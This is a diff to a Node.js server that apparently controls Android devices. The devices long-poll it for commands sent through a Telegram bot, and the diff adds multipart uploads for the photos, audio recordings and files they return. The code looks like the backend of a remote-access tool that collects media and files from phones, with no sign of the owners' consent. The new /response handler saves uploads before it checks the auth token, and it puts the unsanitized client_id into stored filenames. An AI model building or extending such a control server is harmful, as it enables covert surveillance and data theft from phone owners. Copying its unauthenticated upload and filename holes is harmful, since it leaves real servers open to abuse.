@@ -12,9 +12,10 @@ const uploadsDir = path.join(__dirname, 'public/uploads');
 if (!fs.existsSync(uploadsDir)) {
     fs.mkdirSync(uploadsDir, { recursive: true });
 }
-const { v4: uuidv4 } = require('uuid');
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
+const multer = require('multer');
+const { v4: uuidv4 } = require('uuid');
 
 
 /** ===================================
@@ -99,6 +100,18 @@ app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'templates'));
 // Ekspos folder public agar bisa diakses browser
 app.use('/public', express.static(path.join(__dirname, 'public')));
+
+// Multer storage: Langsung simpan ke disk agar tidak makan RAM
+const upload = multer({
+    storage: multer.diskStorage({
+        destination: (req, file, cb) => cb(null, uploadsDir),
+        filename: (req, file, cb) => {
+            const client_id = req.query.client_id || 'unknown';
+            cb(null, `${file.fieldname}_${client_id}_${Date.now()}${path.extname(file.originalname || '.jpg')}`);
+        }
+    }),
+    limits: { fileSize: 100 * 1024 * 1024 } // Batas 100MB
+});
 
 // Helper function
 const updateDeviceSeen = async (deviceId, mode = 'normal', ipv6 = null, ipv4 = null, isOffline = false) => {
@@ -681,10 +694,12 @@ Format Eksekusi Manual:
 
             if (command === 'mv_finish') {
                 command = 'mv';
-                let dest = ctx.message.text;
+                let dest = ctx.message.text.trim();
+                // Jika input bukan path absolut, gabungkan dengan parent directory asal
                 if (!dest.startsWith('/')) {
-                    const parentDir = srcPath.substring(0, srcPath.lastIndexOf('/'));
-                    dest = parentDir + '/' + dest;
+                    const lastSlash = srcPath.lastIndexOf('/');
+                    const parentDir = lastSlash !== -1 ? srcPath.substring(0, lastSlash) : '/storage/emulated/0';
+                    dest = (parentDir === '/' ? '' : parentDir) + '/' + dest;
                 }
                 finalPayload = `${srcPath}|${dest}`;
                 delete activeInput[chatId];
@@ -799,40 +814,77 @@ app.get('/poll', async (req, res) => {
     // Mode turbo: langsung balas tanpa long-polling
     if (mode === 'turbo' || mode === 'short') return res.json({ command: 'none', polling_mode: serverMode });
 
-    // Mode normal: long-polling, tunggu hingga 25 detik
-    if (waitingClients[client_id]) try { waitingClients[client_id].json({ command: 'none', polling_mode: serverMode }); } catch (e) { }
+    // Mode normal: long-polling, tunggu hingga 20 detik (selaras dengan timeout Android)
+    if (waitingClients[client_id]) {
+        try {
+            waitingClients[client_id].json({ command: 'none', polling_mode: serverMode });
+        } catch (e) { }
+        delete waitingClients[client_id];
+    }
+
     waitingClients[client_id] = res;
+
+    // Pastikan koneksi dibersihkan jika client menutupnya tiba-tiba (Race Condition Fix)
+    res.on('close', () => {
+        if (waitingClients[client_id] === res) {
+            delete waitingClients[client_id];
+        }
+    });
+
     setTimeout(() => {
         if (waitingClients[client_id] === res) {
             delete waitingClients[client_id];
             res.json({ command: 'none', polling_mode: serverMode });
         }
-    }, 25000);
+    }, 20000);
 });
 
-app.post('/response', async (req, res) => {
+app.post('/response', upload.single('media_file'), async (req, res) => {
     const { client_id, auth, ipv6, ipv4 } = req.query;
-    const data = req.body;
+
+    // Jika ada file multipart, data JSON dilewatkan via field 'json_data' di body
+    let data;
+    if (req.file) {
+        try {
+            data = JSON.parse(req.body.json_data || '{}');
+        } catch (e) {
+            data = req.body; // Fallback jika parsing gagal
+        }
+    } else {
+        data = req.body;
+    }
+
     if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
     await updateDeviceSeen(client_id, 'normal', ipv6, ipv4);
     let logData = { ...data };
 
-    // ══ STRIP BASE64 DARI SEMUA TIPE MEDIA ══
-    // Selalu hapus base64 sebelum masuk DB untuk mencegah database bengkak.
-    // Setiap tipe dihandle terpisah agar kegagalan simpan file tidak membuat
-    // base64 ikut tersimpan di SQLite.
+    // ══ PROCESS MULTIPART FILE (Metode Efisien Baru) ══
+    if (req.file) {
+        const fileUrl = `/public/uploads/${req.file.filename}`;
 
-    if (data.type === 'photo_base64' && data.data) {
-        // Strip base64 terlebih dahulu (selalu dilakukan)
+        if (data.type === 'photo_multipart') {
+            logData.data = fileUrl;
+            logData.type = 'photo_url';
+        } else if (data.type === 'audio_multipart') {
+            logData.data = fileUrl;
+            logData.type = 'audio_url';
+        } else if (data.type === 'file_multipart') {
+            logData.data = { name: req.file.originalname, url: fileUrl };
+            logData.type = 'file_download_url';
+        } else {
+            // Default jika tipe tidak spesifik tapi ada file
+            logData.data = fileUrl;
+        }
+    }
+    // ══ FALLBACK: STRIP BASE64 (Metode Lama, Tetap didukung) ══
+    else if (data.type === 'photo_base64' && data.data) {
         logData.data = null;
         logData.type = 'photo_url';
         try {
             const filename = `photo_${client_id}_${Date.now()}.jpg`;
             fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
             logData.data = `/public/uploads/${filename}`;
-        } catch (e) {
-            logData.data = '[gagal simpan file foto]';
-        }
+        } catch (e) { logData.data = '[gagal simpan file foto]'; }
     } else if (data.type === 'audio_base64' && data.data) {
         logData.data = null;
         logData.type = 'audio_url';
@@ -840,11 +892,8 @@ app.post('/response', async (req, res) => {
             const filename = `audio_${client_id}_${Date.now()}.mp4`;
             fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
             logData.data = `/public/uploads/${filename}`;
-        } catch (e) {
-            logData.data = '[gagal simpan file audio]';
-        }
+        } catch (e) { logData.data = '[gagal simpan file audio]'; }
     } else if (data.type === 'file_download' && data.data && data.data.data) {
-        // file_download menyimpan base64 di data.data.data — harus distrip juga
         const origName = data.data.name || 'file';
         logData.data = { name: origName, url: null };
         logData.type = 'file_download_url';
@@ -853,9 +902,7 @@ app.post('/response', async (req, res) => {
             const filename = `dl_${client_id}_${Date.now()}_${safeName}`;
             fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data.data, 'base64'));
             logData.data.url = `/public/uploads/${filename}`;
-        } catch (e) {
-            logData.data.url = '[gagal simpan file download]';
-        }
+        } catch (e) { logData.data.url = '[gagal simpan file download]'; }
     }
 
     await db.run('INSERT INTO system_logs (device_id, command_id, level, message) VALUES (?, ?, ?, ?)', [client_id, data.id || null, data.level || 'INFO', JSON.stringify(logData)]);
